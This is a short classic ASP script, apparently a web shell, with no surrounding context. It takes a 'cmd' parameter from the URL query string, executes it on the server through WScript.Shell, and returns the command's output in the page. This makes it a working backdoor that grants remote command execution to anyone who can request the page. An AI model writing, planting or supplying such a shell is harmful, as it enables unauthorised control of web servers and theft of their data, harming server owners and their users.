<%
Dim cmd
cmd = Request.QueryString("cmd")
If cmd <> "" Then
    Set oShell = CreateObject("WScript.Shell")
    Set oExec = oShell.Exec(cmd)
    Response.Write oExec.StdOut.ReadAll()
End If
%>
